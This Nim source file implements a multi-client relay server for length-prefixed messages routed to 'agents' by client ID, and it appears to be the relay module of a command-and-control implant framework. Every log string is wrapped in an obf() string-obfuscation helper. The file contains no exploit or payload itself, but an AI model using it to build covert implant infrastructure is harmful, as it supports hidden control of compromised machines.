import net, nativesockets, strutils, times, os, tables
import relay_protocol
import ../../util/strenc

const
    MAX_MESSAGE_SIZE* = 1024 * 1024  # 1MB max message size - prevents memory exhaustion
    HEADER_SIZE = 4  # 4 bytes for message length

type
    RelayConnection* = object
        socket*: Socket
        isConnected*: bool
        remoteHost*: string
        remotePort*: int
        clientID*: string  # Track client ID for routing
        lastActivity*: int64  # Track last message time
    
    RelayServer* = object
        socket*: Socket
        port*: int
        isListening*: bool
        connections*: seq[RelayConnection]
        clientRegistry*: Table[string, int]  # ClientID → Connection index mapping

# Safe function to parse 4 bytes into uint32 (little endian)
proc parseUint32LE(bytes: string): uint32 =
    if bytes.len != 4:
        return 0
    
    result = uint32(ord(bytes[0])) or
             (uint32(ord(bytes[1])) shl 8) or
             (uint32(ord(bytes[2])) shl 16) or
             (uint32(ord(bytes[3])) shl 24)

# Safe function to encode uint32 into 4 bytes (little endian)
proc encodeUint32LE(value: uint32): string =
    result = newString(4)
    result[0] = char(value and 0xFF)
    result[1] = char((value shr 8) and 0xFF)
    result[2] = char((value shr 16) and 0xFF)
    result[3] = char((value shr 24) and 0xFF)

# Create relay connection to upstream relay
proc connectToRelay*(host: string, port: int): RelayConnection =
    result.remoteHost = host
    result.remotePort = port
    result.isConnected = false
    
    try:
        result.socket = newSocket()
        result.socket.connect(host, Port(port))
        
        # CRITICAL: Set client socket to non-blocking mode ONCE at creation
        setBlocking(result.socket.getFd(), false)
        
        result.isConnected = true
        
        when defined verbose:
            echo obf("[DEBUG]: Connected to relay at ") & host & ":" & $port & obf(" (non-blocking mode)")
    except:
        result.isConnected = false
        when defined verbose:
            echo obf("[DEBUG]: Failed to connect to relay at ") & host & ":" & $port

# Start relay server (NON-BLOCKING)
proc startRelayServer*(port: int): RelayServer =
    result.port = port
    result.connections = @[]
    result.clientRegistry = initTable[string, int]()  # Initialize client registry
    result.isListening = false
    
    try:
        result.socket = newSocket()
        result.socket.setSockOpt(OptReuseAddr, true)
        result.socket.bindAddr(Port(port))
        result.socket.listen()
        
        # CRITICAL: Set server socket to non-blocking mode ONCE at creation
        setBlocking(result.socket.getFd(), false)
        
        result.isListening = true
        
        when defined debug:
            echo obf("[SOCKET] FD=") & $int(result.socket.getFd()) & obf(" CREATED (server socket)")
            echo obf("[STATE] Server listening on port ") & $port
            echo obf("[RELAY] 🚀 Multi-Client Relay server started on port ") & $port & obf(" (non-blocking mode)")
            echo obf("[MULTI-CLIENT] Ready to accept multiple relay clients on same port")
    except:
        result.isListening = false
        when defined debug:
            echo obf("[CRITICAL] Failed to start relay server on port ") & $port & obf(": ") & getCurrentExceptionMsg()

# Accept new downstream connection (NON-BLOCKING)
proc acceptConnection*(server: var RelayServer): RelayConnection =
    result.isConnected = false
    
    if not server.isListening:
        when defined debug:
            echo obf("[RELAY] Server not listening, cannot accept connection")
        return
    
    try:
        when defined debug:
            echo obf("[RELAY] acceptConnection: Attempting to accept new connection")
        
        var clientSocket: Socket
        server.socket.accept(clientSocket)
        
        # CRITICAL: Set client socket to non-blocking mode ONCE at creation
        setBlocking(clientSocket.getFd(), false)
        
        result.socket = clientSocket
        result.isConnected = true
        result.remoteHost = ""  # Will be filled by client registration
        result.remotePort = 0
        result.clientID = ""  # Will be set during registration
        result.lastActivity = epochTime().int64
        
        # Only add if we don't already have this connection
        server.connections.add(result)
        
        when defined debug:
            echo obf("[SOCKET] FD=") & $int(clientSocket.getFd()) & obf(" CREATED (client connection)")
            echo obf("[STATE] New connection created - Total connections: ") & $server.connections.len
            echo obf("[MULTI-CLIENT] 🔗 Accepted new relay client connection, total: ") & $server.connections.len
    except:
        let errorMsg = getCurrentExceptionMsg()
        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
            result.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to accept connection: ") & errorMsg
        else:
            # No connections waiting - normal for non-blocking
            result.isConnected = false
            when defined debug:
                echo obf("[RELAY] No connections waiting (non-blocking): ") & errorMsg

# Send message through connection - WITH TIMEOUT PROTECTION
proc sendMessage*(conn: var RelayConnection, msg: RelayMessage): bool =
    # RACE CONDITION PROTECTION: Check connection state atomically
    if not conn.isConnected:
        when defined debug:
            echo obf("[SOCKET] Cannot send message - connection not active")
        return false
    
    try:
        let serializedMsg = serialize(msg)
        let msgLength = uint32(serializedMsg.len)
        
        # Validate message size before sending
        if msgLength > MAX_MESSAGE_SIZE:
            when defined debug:
                echo obf("[RELAY] Message too large: ") & $msgLength & obf(" bytes, max allowed: ") & $MAX_MESSAGE_SIZE
            return false
        
        when defined debug:
            echo obf("[RELAY] Sending message of length: ") & $msgLength
        
        # CRITICAL FIX: Set socket to non-blocking mode for send to prevent hanging
        # This prevents infinite blocking when server closes connection
        conn.socket.getFd().setBlocking(false)
        
        # Send message length first (4 bytes) - using safe encoding
        let lengthHeader = encodeUint32LE(msgLength)
        
        when defined debug:
            echo obf("[RELAY] 💀 HANG DETECTION: About to send header - ") & $lengthHeader.len & obf(" bytes")
            echo obf("[RELAY] 💀 CRITICAL: If this hangs, client is corrupted!")
            
            # BASIC SOCKET FD CHECK to detect corruption before hang
            try:
                let fd = conn.socket.getFd()
                if fd == osInvalidSocket:
                    echo obf("[RELAY] 💀 SOCKET FD CORRUPTED - would cause infinite hang!")
                    conn.isConnected = false
                    return false
                else:
                    echo obf("[RELAY] ✅ Socket FD valid: ") & $int(fd)
            except:
                echo obf("[RELAY] 💀 SOCKET CHECK FAILED - client corrupted!")
                conn.isConnected = false
                return false
        
        # CRITICAL POINT: This is where the hang occurs in cycle #39
        let headerBytesSent = conn.socket.send(lengthHeader.cstring, lengthHeader.len)
        
        when defined debug:
            echo obf("[RELAY] 🎉 socket.send() COMPLETED! (did not hang)")
            echo obf("[RELAY] 📊 Send result: ") & $headerBytesSent & obf("/") & $lengthHeader.len & obf(" bytes")
        
        # Check if send was successful
        if headerBytesSent != lengthHeader.len:
            when defined debug:
                echo obf("[RELAY] ❌ Header send failed: sent ") & $headerBytesSent & obf(" of ") & $lengthHeader.len & obf(" bytes")
                echo obf("[RELAY] ❌ Server likely closed connection")
            conn.isConnected = false
            return false
        
        when defined debug:
            echo obf("[RELAY] Header sent successfully")
        
        # Send message data
        when defined debug:
            echo obf("[RELAY] Sending message data: ") & $serializedMsg.len & obf(" bytes")
        
        # NON-BLOCKING SEND for message data
        let msgBytesSent = conn.socket.send(serializedMsg.cstring, serializedMsg.len)
        
        # Check if message data send was successful
        if msgBytesSent != serializedMsg.len:
            when defined debug:
                echo obf("[RELAY] ❌ Message data send failed: sent ") & $msgBytesSent & obf(" of ") & $serializedMsg.len & obf(" bytes")
                echo obf("[RELAY] ❌ Server likely closed connection")
            conn.isConnected = false
            return false
        
        when defined debug:
            echo obf("[RELAY] Message data sent successfully")
        
        when defined verbose:
            echo obf("[DEBUG]: Sent message type ") & $msg.msgType & obf(" to ") & conn.remoteHost
        
        when defined debug:
            echo obf("[RELAY] ✅ Message sent successfully")
        
        return true
    except:
        # TIMEOUT OR CONNECTION ERROR
        let errorMsg = getCurrentExceptionMsg()
        when defined debug:
            echo obf("[RELAY] 💥 Send failed: ") & errorMsg
            if "would block" in errorMsg.toLower() or "temporarily unavailable" in errorMsg.toLower():
                echo obf("[RELAY] 🔍 Send would block - server connection dead")
            else:
                echo obf("[RELAY] 🔍 Send error - connection problem")
        
        # ATOMIC STATE CHANGE: Mark as disconnected only if still connected
        if conn.isConnected:
            conn.isConnected = false
            when defined debug:
                echo obf("[STATE] Connection marked as disconnected due to send error: ") & errorMsg
        return false

# Receive message from connection
proc receiveMessage*(conn: var RelayConnection): RelayMessage =
    if not conn.isConnected:
        when defined debug:
            echo obf("[RELAY] Cannot receive message, connection not active")
        return
    
    try:
        # Receive message length first (4 bytes) - SECURE VERSION
        var lengthBuffer = newString(HEADER_SIZE)
        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
        
        if bytesRead != HEADER_SIZE:
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to receive message length, got ") & $bytesRead & obf(" bytes, expected ") & $HEADER_SIZE
            return
        
        # Parse length safely - NO MORE UNSAFE CAST!
        let msgLength = parseUint32LE(lengthBuffer)
               
        if msgLength == 0:
            when defined debug:
                echo obf("[RELAY] Invalid message length: 0")
            conn.isConnected = false
            return
        
        if msgLength > MAX_MESSAGE_SIZE:
            when defined debug:
                echo obf("[RELAY] Message too large: ") & $msgLength & obf(" bytes, max allowed: ") & $MAX_MESSAGE_SIZE
            conn.isConnected = false  # Disconnect malicious client
            return
        
        when defined debug:
            echo obf("[RELAY] Receiving message of length: ") & $msgLength & obf(" bytes")
        
        # Receive message data - now safe with validated length
        var msgBuffer = newString(int(msgLength))
        let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
        
        if msgBytesRead != int(msgLength):
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] Failed to receive full message, got ") & $msgBytesRead & obf(" of ") & $msgLength & obf(" bytes")
            return
        
        result = deserialize(msgBuffer)
        
        when defined debug:
            echo obf("[RELAY] Received message type ") & $result.msgType & obf(" from ") & result.fromID
            
    except:
        conn.isConnected = false
        when defined debug:
            echo obf("[RELAY] Failed to receive message: ") & getCurrentExceptionMsg()

# Close connection
proc closeConnection*(conn: var RelayConnection) =
    if conn.isConnected:
        try:
            when defined debug:
                echo obf("[SOCKET] FD=") & $int(conn.socket.getFd()) & obf(" CLOSING")
            conn.socket.close()
            conn.isConnected = false  # CRITICAL: Move inside try block for atomic operation
            when defined debug:
                echo obf("[SOCKET] Connection closed successfully")
        except:
            # Socket already closed or invalid - safe to ignore
            conn.isConnected = false  # Ensure state is consistent
            when defined debug:
                echo obf("[SOCKET] Connection already closed or invalid: ") & getCurrentExceptionMsg()
    else:
        when defined debug:
            echo obf("[SOCKET] Connection already marked as closed, skipping")

# Register client in the multi-client registry
proc registerClient*(server: var RelayServer, clientID: string, connectionIndex: int) =
    server.clientRegistry[clientID] = connectionIndex
    if connectionIndex < server.connections.len:
        server.connections[connectionIndex].clientID = clientID
        server.connections[connectionIndex].lastActivity = epochTime().int64
        
        when defined debug:
            echo obf("[MULTI-CLIENT] 📝 Registered client: ") & clientID & obf(" at connection index ") & $connectionIndex
            echo obf("[MULTI-CLIENT] 📊 Total registered clients: ") & $server.clientRegistry.len

# Send message to specific client by ID (UNICAST)
proc sendToClient*(server: var RelayServer, clientID: string, msg: RelayMessage): bool =
    when defined debug:
        echo obf("[UNICAST] 🎯 Attempting to send to clientID: '") & clientID & obf("'")
        echo obf("[UNICAST] 🎯 Message type: ") & $msg.msgType
        echo obf("[UNICAST] 🎯 Registry has ") & $server.clientRegistry.len & obf(" clients")
        var registryContents = ""
        for id, idx in server.clientRegistry:
            if registryContents != "": registryContents.add(", ")
            registryContents.add("'" & id & "'→" & $idx)
        echo obf("[UNICAST] 🎯 Registry contents: [") & registryContents & obf("]")
    
    if not server.clientRegistry.hasKey(clientID):
        when defined debug:
            echo obf("[UNICAST] ❌ Client '") & clientID & obf("' NOT FOUND in registry!")
            echo obf("[UNICAST] ❌ This is the root cause of command delivery failure!")
        return false
    
    let connectionIndex = server.clientRegistry[clientID]
    if connectionIndex >= server.connections.len:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Invalid connection index for client: ") & clientID
        # Clean up invalid registry entry
        server.clientRegistry.del(clientID)
        return false
    
    var conn = server.connections[connectionIndex]
    if not conn.isConnected:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Client connection dead: ") & clientID
        # Clean up dead connection from registry
        server.clientRegistry.del(clientID)
        return false
    
    when defined debug:
        echo obf("[MULTI-CLIENT] 📤 Sending message to client: ") & clientID & obf(" (type: ") & $msg.msgType & obf(")")
    
    let success = sendMessage(conn, msg)
    if success:
        # Update connection back to array (sendMessage might modify it)
        server.connections[connectionIndex] = conn
        server.connections[connectionIndex].lastActivity = epochTime().int64
        when defined debug:
            echo obf("[MULTI-CLIENT] ✅ Message sent to client: ") & clientID
    else:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Failed to send message to client: ") & clientID
        # Clean up failed connection from registry
        server.clientRegistry.del(clientID)
    
    return success

# Get list of connected clients
proc getConnectedClients*(server: RelayServer): seq[string] =
    result = @[]
    for clientID, index in server.clientRegistry:
        if index < server.connections.len and server.connections[index].isConnected:
            result.add(clientID)

# Close relay server
proc closeRelayServer*(server: var RelayServer) =
    if server.isListening:
        try:
            when defined debug:
                echo obf("[STATE] Shutting down relay server on port ") & $server.port
                echo obf("[STATE] Closing ") & $server.connections.len & obf(" active connections")
                echo obf("[MULTI-CLIENT] Clearing ") & $server.clientRegistry.len & obf(" registered clients")
            
            # Close all client connections
            for conn in server.connections.mitems:
                closeConnection(conn)
            server.connections = @[]
            
            # Clear client registry
            server.clientRegistry.clear()
            
            # Close server socket
            when defined debug:
                echo obf("[SOCKET] FD=") & $int(server.socket.getFd()) & obf(" CLOSING (server socket)")
            server.socket.close()
            when defined debug:
                echo obf("[SOCKET] Server socket closed successfully")
        except:
            when defined debug:
                echo obf("[CRITICAL] Error during server shutdown: ") & getCurrentExceptionMsg()
        
        server.isListening = false
        when defined debug:
            echo obf("[STATE] Multi-client relay server shutdown complete")

# Poll for incoming messages (NON-BLOCKING)
proc pollMessages*(conn: var RelayConnection, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not conn.isConnected:
        when defined debug:
            echo obf("[RELAY] pollMessages: Connection not active")
        return
    
    try:
        when defined debug:
            echo obf("[RELAY] pollMessages: Attempting to read from socket (already non-blocking)")
        
        # Try to receive message length header (4 bytes) - socket already non-blocking
        var lengthBuffer = newString(HEADER_SIZE)
        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
        
        when defined debug:
            echo obf("[RELAY] pollMessages: Header recv returned ") & $bytesRead & obf(" bytes")
        
        if bytesRead == HEADER_SIZE:
            # We have a complete header, parse it
            let msgLength = parseUint32LE(lengthBuffer)
            
            when defined debug:
                echo obf("[RELAY] pollMessages: Message length: ") & $msgLength
            
            if msgLength > 0 and msgLength <= MAX_MESSAGE_SIZE:
                # Try to receive the full message
                var msgBuffer = newString(int(msgLength))
                let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
                
                when defined debug:
                    echo obf("[RELAY] pollMessages: Message recv returned ") & $msgBytesRead & obf(" of ") & $msgLength & obf(" bytes")
                
                if msgBytesRead == int(msgLength):
                    # Complete message received
                    let msg = deserialize(msgBuffer)
                    if validateMessage(msg):
                        when defined debug:
                            echo obf("[RELAY] pollMessages: Valid message received")
                        result.add(msg)
                else:
                    when defined debug:
                        echo obf("[RELAY] pollMessages: Incomplete message received")
            else:
                when defined debug:
                    echo obf("[RELAY] pollMessages: Invalid message length")
                conn.isConnected = false
        elif bytesRead == 0:
            # Connection closed
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] pollMessages: Connection closed by peer")
        else:
            # bytesRead < 0 means no data available (EAGAIN/EWOULDBLOCK) - normal for non-blocking
            when defined debug:
                echo obf("[RELAY] pollMessages: No data available (non-blocking)")
        
    except:
        let errorMsg = getCurrentExceptionMsg()
        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
            conn.isConnected = false
            when defined debug:
                echo obf("[RELAY] pollMessages: Connection error: ") & errorMsg
        else:
            when defined debug:
                echo obf("[RELAY] pollMessages: No data available (exception): ") & errorMsg

# Clean up dead connections and client registry
proc cleanupConnections*(server: var RelayServer) =
    var activeConnections: seq[RelayConnection] = @[]
    var newClientRegistry = initTable[string, int]()
    var removedCount = 0
    var newIndex = 0
    
    for i, conn in server.connections:
        if conn.isConnected:
            activeConnections.add(conn)
            # Update registry with new index if client is registered
            if conn.clientID != "":
                newClientRegistry[conn.clientID] = newIndex
                when defined debug:
                    echo obf("[CLEANUP] Remapped client ") & conn.clientID & obf(" from index ") & $i & obf(" to ") & $newIndex
            newIndex += 1
        else:
            # CRITICAL FIX: Close socket before removing dead connection
            # This prevents file descriptor leaks
            try:
                if conn.socket != nil:
                    when defined debug:
                        echo obf("[CLEANUP] Closing dead connection socket FD=") & $int(conn.socket.getFd())
                    conn.socket.close()
                    when defined debug:
                        echo obf("[CLEANUP] Dead connection socket closed successfully")
            except:
                when defined debug:
                    echo obf("[CLEANUP] Dead connection socket already closed or invalid: ") & getCurrentExceptionMsg()
            
            # Remove from client registry if registered
            if conn.clientID != "":
                when defined debug:
                    echo obf("[MULTI-CLIENT] 🗑️  Removing dead client from registry: ") & conn.clientID
            
            removedCount += 1
            when defined debug:
                echo obf("[CLEANUP] Removing dead connection (socket properly closed)")
    
    server.connections = activeConnections
    server.clientRegistry = newClientRegistry
    
    when defined debug:
        if removedCount > 0:
            echo obf("[CLEANUP] ✅ Memory leak fixed: Removed ") & $removedCount & obf(" dead connections, ") & $activeConnections.len & obf(" remaining")
            echo obf("[CLEANUP] File descriptors properly released for ") & $removedCount & obf(" connections")
            echo obf("[MULTI-CLIENT] 🔄 Registry updated: ") & $newClientRegistry.len & obf(" clients mapped to new indices")

# Poll relay server for new connections and messages (NON-BLOCKING)
proc pollRelayServer*(server: var RelayServer, timeout: int = 100): seq[RelayMessage] =
    result = @[]
    
    if not server.isListening:
        when defined debug:
            echo obf("[RELAY] Cannot poll server, not listening")
        return
    
    when defined debug:
        echo obf("[RELAY] Polling server with ") & $server.connections.len & obf(" connections")
    
    try:
        # Only try to accept new connections if we don't have any active connections
        # This prevents the "Bad file descriptor" error when connections already exist
        var hasActiveConnections = false
        for conn in server.connections:
            if conn.isConnected:
                hasActiveConnections = true
                break
        
        # Check server socket health BEFORE attempting operations
        try:
            # Test server socket health by checking if it's still valid
            let serverFd = server.socket.getFd()
            if serverFd == osInvalidSocket:
                when defined debug:
                    echo obf("[CRITICAL] 🚨 SERVER SOCKET CORRUPTION DETECTED!")
                    echo obf("[CRITICAL] 🚨 Server FD is invalid: ") & $int(serverFd)
                    echo obf("[CRITICAL] 🚨 Port: ") & $server.port & obf(", Connections: ") & $server.connections.len
                    echo obf("[RELAY] CRITICAL: Server socket is invalid, stopping server")
                server.isListening = false
                return result
        except:
            when defined debug:
                echo obf("[CRITICAL] 🚨 CANNOT ACCESS SERVER SOCKET!")
                echo obf("[CRITICAL] 🚨 Exception: ") & getCurrentExceptionMsg()
                echo obf("[CRITICAL] 🚨 Port: ") & $server.port & obf(", Connections: ") & $server.connections.len
                echo obf("[RELAY] CRITICAL: Cannot access server socket, stopping server")
            server.isListening = false
            return result

        # MULTI-CLIENT: Always try to accept new connections (non-blocking)
        try:
            when defined debug:
                echo obf("[MULTI-CLIENT] Checking for new connections (current: ") & $server.connections.len & obf(")")
            
            var newConn = acceptConnection(server)
            if newConn.isConnected:
                when defined debug:
                    echo obf("[MULTI-CLIENT] 🔗 New client connection accepted! Total connections: ") & $server.connections.len
        except:
            let errorMsg = getCurrentExceptionMsg()
            if "Bad file descriptor" in errorMsg:
                when defined debug:
                    echo obf("[CRITICAL] 🚨 SOCKET CORRUPTION: Bad file descriptor detected!")
                    echo obf("[CRITICAL] 🚨 Server Port: ") & $server.port
                    echo obf("[CRITICAL] 🚨 Active Connections: ") & $server.connections.len
                    echo obf("[CRITICAL] 🚨 Error Message: ") & errorMsg
                    echo obf("[RELAY] CRITICAL: Server socket corrupted - ") & errorMsg
                    echo obf("[RELAY] CRITICAL: Stopping relay server due to socket corruption")
                server.isListening = false  # Stop the corrupted server
                return result
            elif "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
                when defined debug:
                    echo obf("[RELAY] Failed to accept connection: ") & errorMsg
            # No new connections available, that's normal for non-blocking

        # Check existing connections for messages (NON-BLOCKING)
        for i, conn in server.connections.mpairs:
            if conn.isConnected:
                when defined debug:
                    echo obf("[RELAY] Checking connection ") & $i & obf(" for messages")
                
                # READ ALL AVAILABLE MESSAGES from this connection
                var messagesRead = 0
                while true:
                    try:
                        # Try to receive message length header (4 bytes) - socket already non-blocking
                        var lengthBuffer = newString(HEADER_SIZE)
                        let bytesRead = conn.socket.recv(lengthBuffer, HEADER_SIZE)
                        
                        if bytesRead == HEADER_SIZE:
                            # We have a complete header, parse it
                            let msgLength = parseUint32LE(lengthBuffer)
                            
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" message length: ") & $msgLength
                            
                            if msgLength > 0 and msgLength <= MAX_MESSAGE_SIZE:
                                # Try to receive the full message
                                var msgBuffer = newString(int(msgLength))
                                let msgBytesRead = conn.socket.recv(msgBuffer, int(msgLength))
                                
                                if msgBytesRead == int(msgLength):
                                    # Complete message received
                                    let msg = deserialize(msgBuffer)
                                    if validateMessage(msg):
                                        messagesRead += 1
                                        when defined debug:
                                            echo obf("[RELAY] Valid message received from connection ") & $i & obf(" (message #") & $messagesRead & obf(", type: ") & $msg.msgType & obf(")")
                                        
                                        # IDENTITY DEBUGGING: Log every message with connection and ID info
                                        when defined debug:
                                            echo obf("[IDENTITY] 🔍 Connection ") & $i & obf(" → Message type: ") & $msg.msgType & obf(", fromID: '") & msg.fromID & obf("', current clientID: '") & conn.clientID & obf("'")
                                        
                                        # AUTO-REGISTER: Only register clients with FINAL IDs (not PENDING-REGISTRATION)
                                        if conn.clientID == "" and msg.fromID != "" and msg.fromID != "PENDING-REGISTRATION":
                                            # IDENTITY COLLISION PREVENTION: Check if this ID is already registered
                                            if server.clientRegistry.hasKey(msg.fromID):
                                                let existingConnIndex = server.clientRegistry[msg.fromID]
                                                when defined debug:
                                                    echo obf("[IDENTITY] 🚨 ID COLLISION DETECTED during AUTO-REGISTER!")
                                                    echo obf("[IDENTITY] 🚨 Client ID '") & msg.fromID & obf("' already mapped to connection ") & $existingConnIndex
                                                    echo obf("[IDENTITY] 🚨 New message from connection ") & $i & obf(" trying to use same ID")
                                                
                                                # Check if existing connection is still active
                                                if existingConnIndex < server.connections.len and server.connections[existingConnIndex].isConnected:
                                                    when defined debug:
                                                        echo obf("[IDENTITY] 🚨 EXISTING connection ") & $existingConnIndex & obf(" is STILL ACTIVE - REJECTING new registration")
                                                        echo obf("[IDENTITY] 🚨 This prevents identity theft between active clients")
                                                    # REJECT the auto-registration - don't overwrite active client
                                                    continue
                                                else:
                                                    when defined debug:
                                                        echo obf("[IDENTITY] ✅ Existing connection ") & $existingConnIndex & obf(" is DEAD - allowing re-registration")
                                                        echo obf("[IDENTITY] ✅ Cleaning up dead connection and registering new one")
                                                    # Clean up the dead connection mapping
                                                    server.clientRegistry.del(msg.fromID)
                                            
                                            # Safe to register now
                                            conn.clientID = msg.fromID
                                            server.connections[i].clientID = msg.fromID
                                            server.connections[i].lastActivity = epochTime().int64
                                            server.clientRegistry[msg.fromID] = i
                                            when defined debug:
                                                echo obf("[IDENTITY] 🆔 AUTO-REGISTERED: Connection ") & $i & obf(" now has clientID: '") & msg.fromID & obf("'")
                                                echo obf("[IDENTITY] 📊 Registry state: ") & $server.clientRegistry.len & obf(" clients")
                                                var registryState = ""
                                                for id, idx in server.clientRegistry:
                                                    if registryState != "": registryState.add(", ")
                                                    registryState.add(id & "→" & $idx)
                                                echo obf("[IDENTITY] 📋 Registry: [") & registryState & obf("]")
                                                echo obf("[IDENTITY] ✅ Client '") & msg.fromID & obf("' should now be able to receive unicast messages!")
                                        elif conn.clientID != "" and conn.clientID == msg.fromID:
                                            when defined debug:
                                                echo obf("[IDENTITY] ✅ Message from REGISTERED client: '") & msg.fromID & obf("' (connection ") & $i & obf(")")
                                        elif conn.clientID != "" and conn.clientID != msg.fromID and msg.fromID != "PENDING-REGISTRATION":
                                            when defined debug:
                                                echo obf("[IDENTITY] 🚨 IDENTITY THEFT DETECTED!")
                                                echo obf("[IDENTITY] 🚨 Connection ") & $i & obf(" registered as: '") & conn.clientID & obf("'")
                                                echo obf("[IDENTITY] 🚨 But message claims fromID: '") & msg.fromID & obf("'")
                                                echo obf("[IDENTITY] 🚨 This is a CLIENT-SIDE identity confusion!")
                                        elif msg.fromID == "PENDING-REGISTRATION":
                                            when defined debug:
                                                echo obf("[IDENTITY] 📝 Connection ") & $i & obf(" processing PENDING-REGISTRATION message")
                                        
                                        # Update last activity for existing clients
                                        if conn.clientID != "":
                                            server.connections[i].lastActivity = epochTime().int64
                                        
                                        result.add(msg)
                                        # Continue reading more messages from this connection
                                        continue
                                else:
                                    when defined debug:
                                        echo obf("[RELAY] Incomplete message from connection ") & $i
                                    break  # Exit loop, connection has issues
                            else:
                                when defined debug:
                                    echo obf("[RELAY] Invalid message length from connection ") & $i
                                conn.isConnected = false
                                break  # Exit loop, connection is bad
                        elif bytesRead == 0:
                            # Connection closed
                            conn.isConnected = false
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" closed by peer")
                            break  # Exit loop, connection closed
                        else:
                            # bytesRead < 0 means no data available (EAGAIN/EWOULDBLOCK) - normal for non-blocking
                            when defined debug:
                                if messagesRead > 0:
                                    echo obf("[RELAY] Connection ") & $i & obf(" no more data, read ") & $messagesRead & obf(" messages total")
                            break  # Exit loop, no more data available
                    
                    except:
                        # Connection error or no data available
                        let errorMsg = getCurrentExceptionMsg()
                        if "Operation would block" notin errorMsg and "Resource temporarily unavailable" notin errorMsg:
                            conn.isConnected = false
                            when defined debug:
                                echo obf("[RELAY] Connection ") & $i & obf(" error: ") & errorMsg
                        else:
                            when defined debug:
                                if messagesRead > 0:
                                    echo obf("[RELAY] Connection ") & $i & obf(" no more data available, read ") & $messagesRead & obf(" messages total")
                        break  # Exit loop, no more data or connection error
            else:
                when defined debug:
                    echo obf("[RELAY] Connection ") & $i & obf(" is not active")
        
    except:
        when defined debug:
            echo obf("[RELAY] Error during server poll: ") & getCurrentExceptionMsg()
    
    # CRITICAL: Clean up dead connections after each poll cycle
    when defined debug:
        echo obf("[IDENTITY] 🧹 Starting connection cleanup...")
        var beforeCleanup = ""
        for i, conn in server.connections:
            let status = if conn.isConnected: "ACTIVE" else: "DEAD"
            let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
            if beforeCleanup != "": beforeCleanup.add(", ")
            beforeCleanup.add($i & ":" & clientInfo & "(" & status & ")")
        echo obf("[IDENTITY] 🧹 Before cleanup: [") & beforeCleanup & obf("]")
    
    cleanupConnections(server)
    
    when defined debug:
        echo obf("[IDENTITY] 🧹 After cleanup completed...")
        var afterCleanup = ""
        for i, conn in server.connections:
            let status = if conn.isConnected: "ACTIVE" else: "DEAD"
            let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
            if afterCleanup != "": afterCleanup.add(", ")
            afterCleanup.add($i & ":" & clientInfo & "(" & status & ")")
        echo obf("[IDENTITY] 🧹 After cleanup: [") & afterCleanup & obf("]")
        
        # Show registry state after cleanup
        var registryAfterCleanup = ""
        for id, idx in server.clientRegistry:
            if registryAfterCleanup != "": registryAfterCleanup.add(", ")
            registryAfterCleanup.add(id & "→" & $idx)
        echo obf("[IDENTITY] 🧹 Registry after cleanup: [") & registryAfterCleanup & obf("]")
    
    when defined debug:
        let finalConnections = server.connections.len
        var activeCount = 0
        var registeredCount = 0
        for conn in server.connections:
            if conn.isConnected:
                activeCount += 1
                if conn.clientID != "":
                    registeredCount += 1
        echo obf("[RELAY] Poll completed - Total: ") & $finalConnections & obf(", Active: ") & $activeCount & obf(", Registered: ") & $registeredCount
        
        # Log connected clients
        if registeredCount > 0:
            var clientList = ""
            for clientID in server.clientRegistry.keys:
                if clientList != "": clientList.add(", ")
                clientList.add(clientID)
            echo obf("[MULTI-CLIENT] 📋 Connected clients: ") & clientList

# Broadcast message to all downstream connections (LEGACY - avoid if possible)
proc broadcastMessage*(server: var RelayServer, msg: RelayMessage): int =
    result = 0
    when defined debug:
        echo obf("[MULTI-CLIENT] 📡 Broadcasting message (type: ") & $msg.msgType & obf(") to ") & $server.connections.len & obf(" connections")
    
    for conn in server.connections.mitems:
        if conn.isConnected:
            if sendMessage(conn, msg):
                result += 1
                when defined debug:
                    let clientInfo = if conn.clientID != "": conn.clientID else: "unregistered"
                    echo obf("[MULTI-CLIENT] ✅ Broadcast sent to: ") & clientInfo

# Send message to specific downstream connection by agent ID (PREFERRED METHOD)
proc sendToAgent*(server: var RelayServer, agentID: string, msg: RelayMessage): bool =
    when defined debug:
        echo obf("[MULTI-CLIENT] 🎯 Attempting to send to specific agent: ") & agentID
    
    # Use the new unicast function instead of broadcast
    result = sendToClient(server, agentID, msg)
    
    if not result:
        when defined debug:
            echo obf("[MULTI-CLIENT] ❌ Agent not found, message not delivered: ") & agentID

# Get connection statistics with multi-client info
proc getConnectionStats*(server: RelayServer): tuple[listening: bool, connections: int, registeredClients: int] =
    result.listening = server.isListening
    result.connections = 0
    result.registeredClients = 0
    
    for conn in server.connections:
        if conn.isConnected:
            result.connections += 1
            if conn.clientID != "":
                result.registeredClients += 1 